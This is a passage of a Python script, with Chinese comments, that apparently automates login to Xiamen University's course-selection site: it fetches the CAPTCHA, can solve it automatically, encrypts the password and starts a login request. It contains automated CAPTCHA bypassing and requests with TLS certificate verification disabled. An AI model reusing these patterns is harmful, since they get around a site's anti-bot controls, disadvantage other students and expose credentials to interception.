logging.info('\u914d\u7f6e\u6587\u4ef6\u52a0\u8f7d\u6210\u529f')\n        except Exception as e:\n            logging.error(f\"\u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\u5931\u8d25: {str(e)}\")\n            raise\n\n    def request_with_retry(self, method, url, max_retries=3, **kwargs):\n        \"\"\"\u5e26\u91cd\u8bd5\u673a\u5236\u7684\u8bf7\u6c42\u65b9\u6cd5\"\"\"\n        for i in range(max_retries):\n            try:\n                response = self.session.request(method, url, verify=False, **kwargs)\n                response.raise_for_status()\n                return response\n            except requests.exceptions.RequestException as e:\n                logging.error(f\"\u8bf7\u6c42\u5931\u8d25 (\u5c1d\u8bd5 {i+1}/{max_retries}): {str(e)}\")\n                if i == max_retries - 1:\n                    raise e\n                time.sleep(1 * (i + 1))\n\n    def get_captcha(self):\n        \"\"\"\u83b7\u53d6\u9a8c\u8bc1\u7801\"\"\"\n        url = 'https://xk.xmu.edu.cn/xsxkxmu/auth/captcha'\n        logging.info('\u6b63\u5728\u8bf7\u6c42\u9a8c\u8bc1\u7801')\n        \n        try:\n            response = self.request_with_retry('POST', url)\n            data = response.json()\n            \n            if data['code'] == 200:\n                # \u83b7\u53d6base64\u7f16\u7801\u7684\u9a8c\u8bc1\u7801\u56fe\u7247\n                captcha_base64 = data['data']['captcha'].split(',')[1]\n                uuid = data['data']['uuid']\n                \n                if self.captcha_auto:\n                    return {\n                        'uuid': uuid,\n                        'image_base64': captcha_base64\n                    }\n                \n        \n                \n                # \u5c06base64\u8f6c\u6362\u4e3a\u56fe\u7247\n                from PIL import Image\n                import base64\n                import io\n\n                image_data = base64.b64decode(captcha_base64)\n                image = Image.open(io.BytesIO(image_data))\n                \n                # \u4fdd\u5b58\u9a8c\u8bc1\u7801\u56fe\u7247\n                timestamp = time.strftime('%Y%m%d_%H%M%S')\n                filename = f'cache/captcha_{timestamp}.png'\n                image.save(filename)\n                logging.info(f'\u9a8c\u8bc1\u7801\u56fe\u7247\u5df2\u4fdd\u5b58\u4e3a: {filename}')\n                \n                image.show()\n                \n                return {\n                    'uuid': uuid,\n                    'image': image,\n                    'image_path': filename,\n                    'image_base64': captcha_base64\n                }\n            else:\n                logging.error(f\"\u8bf7\u6c42\u5931\u8d25: {data['msg']}\")\n                return None\n                \n        except Exception as e:\n            logging.error(f\"\u83b7\u53d6\u9a8c\u8bc1\u7801\u51fa\u9519: {str(e)}\")\n            return None\n\n    def login(self):\n        \"\"\"\u767b\u5f55\u7cfb\u7edf\"\"\"\n        # \u83b7\u53d6\u9a8c\u8bc1\u7801\n        captcha_result = self.get_captcha()\n        if not captcha_result:\n            logging.error(\"\u83b7\u53d6\u9a8c\u8bc1\u7801\u5931\u8d25\")\n            return False\n\n        if self.captcha_auto:\n            print('\u6b63\u5728\u81ea\u52a8\u8bc6\u522b\u9a8c\u8bc1\u7801...')\n            try:\n                captcha_code = captcha_verify(captcha_result['image_base64'])\n            except Exception as e:\n                logging.error(f\"\u9a8c\u8bc1\u7801\u8bc6\u522b\u51fa\u9519: {str(e)}\")\n                return False\n            print(f'\u9a8c\u8bc1\u7801\u8bc6\u522b\u7ed3\u679c: {captcha_code}')\n        else:\n            captcha_code = input('\u8bf7\u8f93\u5165\u9a8c\u8bc1\u7801: ')\n\n        # \u52a0\u5bc6\u5bc6\u7801\n        encrypted_password = self.aesutil.encrypt(self.password)\n        logging.info('\u5bc6\u7801\u5df2\u52a0\u5bc6')\n\n        # \u51c6\u5907\u767b\u5f55\u6570\u636e\n        login_url = 'https://xk.xmu.edu.cn/xsxkxmu/auth/login'\n        login_data = {\n            'login"
]